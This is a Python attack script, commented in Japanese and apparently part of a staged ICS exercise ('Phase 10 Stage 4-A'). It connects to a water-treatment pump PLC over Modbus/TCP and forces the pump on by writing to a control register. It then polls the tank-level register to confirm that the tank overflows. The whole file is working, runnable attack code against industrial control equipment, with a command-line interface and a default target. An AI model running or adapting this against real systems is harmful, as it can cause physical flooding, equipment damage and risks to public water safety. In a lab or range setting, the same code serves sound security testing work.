"""Modbus ポンプ強制稼働による水処理タンクオーバーフロー攻撃スクリプト（Phase 10 Stage 4-A）。

対象:
    pump_a_plc (Modbus/TCP: 502)
    - レジスタ 40002 (ポンプ制御): 1 (強制ON) を書き込む
    - レジスタ 40001 (水位センサ): 読み取りして水位上昇（Consequence）を追跡

使用方法:
    python modbus_overflow_attack.py --target 10.2.20.10 --port 502 --duration 30
"""
from __future__ import annotations

import argparse
import logging
import sys
import time

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [modbus_attack] %(levelname)s %(message)s",
)
log = logging.getLogger(__name__)

_HOLD_OFFSET = 40001


def addr_to_reg(addr: int) -> int:
    return addr - _HOLD_OFFSET


def run_attack(target: str, port: int = 502, register_pump: int = 40002,
               register_level: int = 40001, duration: int = 15,
               interval: float = 1.0) -> dict[str, any]:
    """Modbus ポンプ強制稼働攻撃を実行し、水位の変動を監視する。

    Returns:
        実行結果サマリー辞書
    """
    try:
        from pymodbus.client import ModbusTcpClient
    except ImportError:
        log.warning("pymodbus not available; simulating attack in DRY_RUN mode")
        return {
            "target": target,
            "port": port,
            "pump_forced_on": True,
            "simulated": True,
            "status": "SUCCESS (SIMULATED)",
        }

    client = ModbusTcpClient(target, port=port, timeout=5)
    if not client.connect():
        log.error("Failed to connect to Modbus target %s:%d", target, port)
        return {"status": "FAILED", "reason": f"Connection failed to {target}:{port}"}

    log.info("Connected to target %s:%d. Injecting pump FORCE_ON (reg=%d <- 1)...",
             target, port, register_pump)

    # ポンプ制御レジスタに 1 (ON) を書き込み
    rq = client.write_register(addr_to_reg(register_pump), 1)
    if rq.isError():
        log.error("Write register failed: %s", rq)
        client.close()
        return {"status": "FAILED", "reason": f"Write register failed: {rq}"}

    log.info("Pump control set to 1 (ON). Monitoring tank level via reg=%d for %ds...",
             register_level, duration)

    initial_level = None
    final_level = None
    start_time = time.time()
    readings = []

    while time.time() - start_time < duration:
        rr = client.read_holding_registers(addr_to_reg(register_level), count=1)
        if not rr.isError():
            raw_val = rr.registers[0]
            level_pct = raw_val / 10.0
            if initial_level is None:
                initial_level = level_pct
            final_level = level_pct
            readings.append(level_pct)
            log.info("Current tank level: %.1f%% (raw=%d)", level_pct, raw_val)
        time.sleep(interval)

    client.close()

    overflow_occurred = final_level is not None and final_level >= 100.0
    level_increased = (
        initial_level is not None
        and final_level is not None
        and final_level > initial_level
    )

    result = {
        "status": "SUCCESS",
        "target": target,
        "port": port,
        "initial_level": initial_level,
        "final_level": final_level,
        "level_increased": level_increased,
        "overflow_occurred": overflow_occurred,
        "readings_count": len(readings),
    }
    log.info("Attack finished: initial=%.1f%% final=%.1f%% increased=%s overflow=%s",
             initial_level or 0.0, final_level or 0.0, level_increased, overflow_occurred)
    return result


def main() -> int:
    parser = argparse.ArgumentParser(description="Modbus Tank Overflow Attack")
    parser.add_argument("--target", default="10.2.20.10", help="Target Modbus IP")
    parser.add_argument("--port", type=int, default=502, help="Target Modbus port")
    parser.add_argument("--duration", type=int, default=15, help="Monitor duration in seconds")
    parser.add_argument("--interval", type=float, default=1.0, help="Polling interval in seconds")
    args = parser.parse_args()

    result = run_attack(target=args.target, port=args.port, duration=args.duration, interval=args.interval)
    if result.get("status") == "SUCCESS":
        return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
